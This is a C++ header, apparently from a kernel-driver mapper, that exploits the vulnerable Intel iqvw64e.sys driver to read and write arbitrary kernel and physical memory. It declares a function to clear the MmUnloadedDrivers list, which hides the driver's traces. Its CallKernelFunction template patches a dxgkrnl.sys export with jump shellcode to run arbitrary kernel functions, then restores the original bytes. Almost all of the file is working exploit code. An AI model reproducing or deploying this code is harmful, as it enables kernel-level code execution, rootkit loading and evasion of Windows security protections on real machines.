#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

namespace intel_driver
{
	constexpr auto driver_name = "iqvw64e.sys";
	constexpr uint32_t ioctl1 = 0x80862007;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	HANDLE Load();
	void Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint64_t* out_kernel_original_function_address);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);

	template<typename T, typename ...A>
	bool CallKernelFunction( HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments )
	{
		UNREFERENCED_PARAMETER( out_result );
 
		if ( !kernel_function_address )
			return false;
 
		// load user mode api
 
		HMODULE hWin32u = LoadLibrary( "win32u.dll" );
 
		if ( !hWin32u )
			return false;
 
		FARPROC win32u_routine
			= GetProcAddress( hWin32u, "NtTokenManagerConfirmOutstandingAnalogToken" );
 
		if ( !win32u_routine )
			return false;
 
		// page in
 
		using tFunction = UINT_PTR ( __stdcall* )( void* a1/*, void* a2, void* a3*/ );
		auto FnWin32u = reinterpret_cast<tFunction>( win32u_routine );
 
		FnWin32u( nullptr/*, nullptr, nullptr */ );
 
		// write shell
 
		const uint64_t dxgk_routine
			= GetKernelModuleExport( device_handle, utils::GetKernelModuleAddress( "dxgkrnl.sys" ), "NtTokenManagerConfirmOutstandingAnalogToken" );
		
		if ( !dxgk_routine )
		{
			printf( "[!] dxgk_routine not found, module: %llx\n", utils::GetKernelModuleAddress( "dxgkrnl.sys" ) );
			return false;
		}
 
		uint8_t dxgk_original[] = { 0x48, 0x89, 0x5C, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0x15, 0x70, 0x00, 0x00 };
		
		if ( !ReadMemory( device_handle, dxgk_routine, &dxgk_original, sizeof( dxgk_original ) ) )
		{
			printf( "[!] failed to create a copy of the function prolouge\n" );
			return false;
		}
 
		uint8_t shell_code_start[]
		{
			0x48, 0xB8 // mov rax, [xxx]
		};
 
		uint8_t shell_code_end[]
		{
			0xFF, 0xE0, // jmp rax
			0xCC //
		};
 
		WriteToReadOnlyMemory( device_handle, dxgk_routine, &shell_code_start, sizeof( shell_code_start ) );
		WriteToReadOnlyMemory( device_handle, dxgk_routine + sizeof( shell_code_start ), &kernel_function_address, sizeof( void* ) );
		WriteToReadOnlyMemory( device_handle, dxgk_routine + sizeof( shell_code_start ) + sizeof( void* ), &shell_code_end, sizeof( shell_code_end ) );
 
		// restore
 
		constexpr auto call_void = std::is_same_v<T, void>;
 
		if constexpr ( !call_void )
		{
			if ( !out_result )
				return false;
		}
 
		if constexpr ( !call_void )
		{
			using FunctionFn = T ( __stdcall* )( A... );
			const auto Function = reinterpret_cast<FunctionFn>( win32u_routine );
			*out_result = Function( arguments ... );
		} else {
			using FunctionFn = void ( __stdcall* )( A... );
			const auto Function = reinterpret_cast<FunctionFn>( win32u_routine );
			Function( arguments... );
		}
 
		// restore
		WriteToReadOnlyMemory( device_handle, dxgk_routine, &dxgk_original, sizeof( dxgk_original ) );
		return true;
	}
}
